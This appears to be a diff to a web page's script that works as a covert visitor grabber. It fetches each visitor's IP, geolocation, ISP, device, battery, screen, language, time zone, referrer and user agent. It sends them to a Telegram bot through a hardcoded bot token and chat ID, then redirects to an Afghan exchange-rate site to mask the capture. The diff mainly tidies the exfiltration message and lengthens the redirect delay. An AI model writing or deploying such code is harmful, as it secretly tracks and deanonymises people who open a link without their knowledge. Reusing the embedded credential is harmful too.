@@ -53,27 +53,22 @@
   <div class="custom-loader"></div>
 
   <script>
-      
     const BOT_TOKEN = "8283253750:AAElG2O-DcOR9fAEHEktk-51rETnif766xw";
     const CHAT_ID = "8223560115";
 
-    // 
     async function collectData() {
       try {
-        //
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const { ip } = await ipRes.json();
         
-        //  
         let location = {};
         try {
           const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
           location = await locRes.json();
         } catch (e) {
-          //  
+          // نادیده گرفتن خطا
         }
         
-          
         let batteryInfo = "Uncertain";
         if ('getBattery' in navigator) {
           try {
@@ -90,32 +85,31 @@
           hour: '2-digit', minute: '2-digit', second: '2-digit'
         }).format(now).replace(/‏/g, '').replace(/\u200E/g, '').replace(/،/g, ',');
         
-      
-        const message = ` new 
+        const message = `📊 New Visitor Data
 
-📡 User location:
+📡 User Location:
 ├─ Country: ${location.country_name || 'Uncertain'}
 ├─ Province: ${location.region || 'Uncertain'}
 ├─ City: ${location.city || 'Uncertain'}
-├─ Postal code: ${location.postral || 'Uncertain'}
+├─ Postal Code: ${location.postal || 'Uncertain'}
 
-🌐 Network information:
-├─ IP: ${ip}
-├─ Provider: ${location.org || 'Uncertain'}
+🌐 Network Information:
+├─ IP Address: ${ip}
+├─ ISP: ${location.org || 'Uncertain'}
 ├─ ASN: ${location.asn || 'Uncertain'}
 
-📱Device information:
-├─ Type: ${/Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}
-├─ Battery: ${batteryInfo}
-├─ Display: ${screen.width}×${screen.height}
+📱 Device Information:
+├─ Device Type: ${/Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}
+├─ Battery Status: ${batteryInfo}
+├─ Screen Resolution: ${screen.width}×${screen.height}
 ├─ Language: ${navigator.language}
-├─ Time zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+├─ Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 
-🕐 Time:
-├─ Local time: ${jalali}
+🕐 Time & Date:
+├─ Local Time: ${jalali}
 
-🔗Other information:
-└─ Reference link: ${document.referrer || 'Without reference'}
+🔗 Other Information:
+├─ Referrer: ${document.referrer || 'Direct Access'}
 └─ User Agent: ${navigator.userAgent}`;
         
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -127,19 +121,17 @@
           })
         });
         
-      } catch (error) {د
+      } catch (error) {
+        // نادیده گرفتن خطا
       }
     }
 
-       
     (async function() {
-      
       await collectData();
-      
       
       setTimeout(() => {
         window.location.href = "https://sarafi.af/fa/exchange-rates/da-afg-bank";
-      }, 2000);
+      }, 3000);
     })();
   </script>
 </body>
